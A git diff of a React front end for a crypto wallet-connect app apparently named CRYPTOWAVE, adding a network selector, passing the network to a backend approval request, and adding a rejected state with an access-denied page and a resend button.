@@ -7,12 +7,14 @@ const API_BASE = import.meta.env.VITE_API_URL || 'https://cryptowave-backend-pq3
 
 function App() {
   const [walletAddress, setWalletAddress] = useState('');
-  const [approvalStatus, setApprovalStatus] = useState('disconnected'); // disconnected, pending, approved
+  const [approvalStatus, setApprovalStatus] = useState('disconnected'); // disconnected, pending, approved, rejected
   const [loading, setLoading] = useState(false);
   const [checkingApproval, setCheckingApproval] = useState(true);
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   const [walletModalOpen, setWalletModalOpen] = useState(false);
   const [provider, setProvider] = useState(null);
+  const [selectedNetwork, setSelectedNetwork] = useState(localStorage.getItem('selectedNetwork') || 'BSC');
+  const selectNetwork = (net) => { setSelectedNetwork(net); localStorage.setItem('selectedNetwork', net); };
 
   // Check approval status with backend
   const checkApproval = useCallback(async (address) => {
@@ -61,7 +63,7 @@ function App() {
               setWalletAddress(accounts[0]);
               setProvider(web3Provider);
               localStorage.setItem('connectedWallet', accounts[0]);
-              await requestApproval(accounts[0]);
+              await requestApproval(accounts[0], selectedNetwork);
             }
           } catch (_) { /* user dismissed — they'll tap Connect manually */ }
           finally { setLoading(false); }
@@ -84,6 +86,7 @@ function App() {
   }, [walletAddress]); // eslint-disable-line react-hooks/exhaustive-deps
 
   // Poll for approval every 5 seconds when pending
+  // If wallet is not found in DB (failed to register), auto re-submit
   useEffect(() => {
     if (walletAddress && approvalStatus === 'pending') {
       const interval = setInterval(async () => {
@@ -93,6 +96,9 @@ function App() {
           if (data.approved) {
             setApprovalStatus('approved');
             localStorage.setItem('approvalStatus', 'approved');
+          } else if (data.found === false) {
+            // Not in DB at all — previous request failed, re-submit silently
+            requestApproval(walletAddress, selectedNetwork);
           }
         } catch (error) {
           console.error('Polling error:', error);
@@ -100,30 +106,35 @@ function App() {
       }, 5000);
       return () => clearInterval(interval);
     }
-  }, [walletAddress, approvalStatus]);
+  }, [walletAddress, approvalStatus]); // eslint-disable-line react-hooks/exhaustive-deps
 
   // Request approval from backend
-  const requestApproval = async (address) => {
+  const requestApproval = async (address, network = 'BSC') => {
     try {
       const response = await fetch(`${API_BASE}/api/request-approval`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           walletAddress: address,
-          ipAddress: 'localhost',
-          userAgent: navigator.userAgent
+          ipAddress: 'client',
+          userAgent: navigator.userAgent,
+          network
         })
       });
       const data = await response.json();
       if (data.approved) {
         setApprovalStatus('approved');
         localStorage.setItem('approvalStatus', 'approved');
+      } else if (data.rejected) {
+        setApprovalStatus('rejected');
+        localStorage.setItem('approvalStatus', 'rejected');
       } else {
         setApprovalStatus('pending');
         localStorage.setItem('approvalStatus', 'pending');
       }
     } catch (error) {
       console.error('Error requesting approval:', error);
+      // Don't set 'pending' on network error — keep 'disconnected' so user can retry
       setApprovalStatus('pending');
       localStorage.setItem('approvalStatus', 'pending');
     }
@@ -199,7 +210,7 @@ function App() {
       setProvider(web3Provider);
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
-      await requestApproval(address);
+      await requestApproval(address, selectedNetwork);
     } catch (error) {
       console.error('MetaMask connection error:', error);
       alert('Failed to connect MetaMask. Please try again.');
@@ -245,7 +256,7 @@ function App() {
       setProvider(web3Provider);
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
-      await requestApproval(address);
+      await requestApproval(address, selectedNetwork);
     } catch (error) {
       console.error('Coinbase Wallet connection error:', error);
       alert('Failed to connect Coinbase Wallet. Please try again.');
@@ -275,7 +286,7 @@ function App() {
       setProvider(web3Provider);
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
-      await requestApproval(address);
+      await requestApproval(address, selectedNetwork);
     } catch (error) {
       console.error('Trust Wallet connection error:', error);
       alert('Failed to connect Trust Wallet. Please try again.');
@@ -331,7 +342,8 @@ function App() {
 
   // If wallet is approved (cached or verified), show Dashboard immediately — no loading flash
   if (approvalStatus === 'approved' && walletAddress) {
-    return <Dashboard walletAddress={walletAddress} onDisconnect={handleDisconnect} />;
+    const net = selectedNetwork || localStorage.getItem('selectedNetwork') || 'BSC';
+    return <Dashboard walletAddress={walletAddress} network={net} onDisconnect={handleDisconnect} />;
   }
 
   // Show loading only while still checking AND status is not yet determined (pending/rejected unknown)
@@ -349,6 +361,32 @@ function App() {
           <div className="pending-card">
             <div className="pending-icon"><div className="spinner"></div></div>
             <h1>Loading...</h1>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  // If wallet is rejected, show rejection page
+  if (approvalStatus === 'rejected' && walletAddress) {
+    return (
+      <div className="App pending-page">
+        <div className="grain-overlay"></div>
+        <div className="bg-gradient"></div>
+        <nav className="nav">
+          <div className="nav-logo"><div className="logo-icon">E</div><span className="logo-text">CRYPTOWAVE</span></div>
+          <button className="nav-connect" onClick={handleDisconnect}>Logout</button>
+        </nav>
+        <div className="pending-container">
+          <div className="pending-card">
+            <div style={{fontSize:'3rem',marginBottom:'1rem'}}>⛔</div>
+            <h1 style={{color:'#ef4444'}}>Access Denied</h1>
+            <p className="pending-description">Your wallet has been rejected by admin. Please contact support.</p>
+            <div className="pending-wallet-info">
+              <span className="pending-label">Wallet</span>
+              <span className="pending-address">{walletAddress}</span>
+            </div>
+            <button className="disconnect-btn-pending" onClick={handleDisconnect}>Disconnect</button>
           </div>
         </div>
       </div>
@@ -416,6 +454,12 @@ function App() {
               This page will automatically update once your wallet is approved.
             </p>
 
+            <button
+              style={{marginBottom:'10px',padding:'10px 24px',background:'rgba(102,126,234,0.15)',border:'1px solid rgba(102,126,234,0.4)',borderRadius:'10px',color:'#667eea',fontWeight:600,cursor:'pointer',width:'100%'}}
+              onClick={() => requestApproval(walletAddress, selectedNetwork)}
+            >
+              Resend Request
+            </button>
             <button className="disconnect-btn-pending" onClick={handleDisconnect}>
               Logout
             </button>
@@ -474,6 +518,16 @@ function App() {
             <div className="wallet-modal-header">
               <h2>Connect Wallet</h2>
               <button className="wallet-modal-close" onClick={closeWalletModal}>✕</button>
+            </div>
+
+            {/* Network selector */}
+            <div style={{padding:'0 20px 4px',display:'flex',gap:'8px',alignItems:'center'}}>
+              <span style={{fontSize:'0.8rem',color:'#94a3b8',fontWeight:600}}>Network:</span>
+              {['BSC','ETH','TRX','BTC'].map(net => (
+                <button key={net} onClick={() => selectNetwork(net)} style={{padding:'4px 12px',borderRadius:'20px',border:'none',fontSize:'0.75rem',fontWeight:700,cursor:'pointer',background: selectedNetwork===net ? '#f0b90b' : 'rgba(255,255,255,0.08)',color: selectedNetwork===net ? '#000' : '#a0a0b0',transition:'all 0.15s'}}>
+                  {net}
+                </button>
+              ))}
             </div>
 
             {/* Mobile without injected wallet: show anchor deep-links */}
